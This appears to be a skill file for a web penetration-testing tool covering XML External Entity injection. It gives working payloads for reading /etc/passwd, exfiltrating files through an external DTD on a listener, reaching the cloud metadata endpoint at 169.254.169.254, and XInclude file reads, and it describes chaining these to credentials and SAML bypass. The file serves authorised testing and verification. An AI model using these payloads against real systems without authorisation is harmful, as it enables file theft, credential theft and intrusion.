---
name: web-xxe
description: >
  Detect and exploit XML External Entity injection. USE WHEN an endpoint parses
  XML (SOAP, SAML, application/xml, file upload of SVG/DOCX/XLSX, or a JSON
  endpoint that also accepts XML). Covers in-band file read, blind/OOB external-DTD
  exfil, error-based parameter-entity leak, SSRF-via-XXE to cloud metadata,
  XInclude, and local-DTD reuse for restricted parsers.
tags: [web, xxe, xml, ssrf, file-read, owasp-a05, injection]
tools: [curl, httpx]
payloads:
  - {kind: glob, path: "vendor/PayloadsAllTheThings/XXE Injection/*.md", license: MIT, credit: "swisskyrepo/PayloadsAllTheThings"}
  - {kind: upstream_doc, path: "vendor/hacktricks/pentesting-web/xxe-xee-xml-external-entity.md", license: CC-BY-SA-4.0, credit: "HackTricks - Carlos Polop"}
verification:
  kind: oob
  signals: ["root:x:0:0:", "for 16-bit app support", "[fonts]"]
references:
  - "https://portswigger.net/web-security/xxe"
  - "https://portswigger.net/web-security/xxe/blind"
license: AGPL-3.0-or-later
version: 1.0.0
---
# XXE — in-band read, or blind OOB exfil

Two proofs: **in-band** (the file content comes back in the response) or **blind
OOB** (a parameter-entity exfil lands on your listener). Both are deterministic;
pick whichever the parser allows.

## Preconditions / triggers
- `Content-Type: application/xml`/`text/xml`, SOAP, SAML assertions, or an upload
  that is really XML underneath (SVG, DOCX/XLSX zip members, `.xml`).
- A JSON endpoint that also accepts XML when you flip the content type.

## Methodology
1. **Find the sink.** Capture XML-consuming flows; try converting a JSON body to
   XML (`Content-Type: application/xml`) — many parsers accept both.
2. **In-band read.** Inject a doctype:
   `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>` and reference `&x;`
   where a value is echoed. `root:x:0:0:` in the response = confirmed.
3. **Blind / OOB.** When nothing is echoed, host an **external DTD** on your
   in-sandbox listener and use parameter entities to exfil file contents to a
   callback URL carrying the correlation id:
   `<!ENTITY % p SYSTEM "http://<listener>/<cid>.dtd">%p;`. The callback is
   captured as a `dns`/`http`/`rawtcp` flow (`req list --protocol dns`).
4. **Error-based.** Force the file content into a parser error message (nested
   parameter entities) and read it via `req search`.
5. **SSRF-via-XXE.** Point the entity at `http://169.254.169.254/...` to reach
   cloud metadata (compose SSRF).
6. **XInclude.** When you can’t control the doctype, use
   `<xi:include href="file:///etc/passwd"/>`.

## Confirmation oracle (0-FP)
`verify.py` uses the **OOB** oracle first (`collab` + `correlation_id`) — an
exfil callback proves blind XXE. If no collaborator, it falls back to a
**signature** match for known file content (`root:x:0:0:`, Windows `win.ini`
markers) in the response flow. A parser that errors on your doctype without
leaking or calling back is **not** confirmed.

## Cross-chain
- XXE → SSRF → cloud metadata creds; XXE in a SAML assertion → auth bypass
  (`web-jwt-auth`-adjacent); XXE → arbitrary file read → `web-path-traversal-lfi`
  targets (source/secrets).

## burpwn recipes
- `req replay <id> --set-body @xxe.xml` — swap the XML payload.
- in-sandbox external-DTD listener + `req list --protocol dns|rawtcp` — OOB exfil.
- `req search 'root:x:0:0'` / error strings — mine in-band and error leaks.

## False-positive traps
- A generic XML validation error is not XXE — you need file content or a callback.
- Entity expansion that is echoed but resolves to nothing (`&x;` literal) means
  external entities are disabled — not vulnerable.
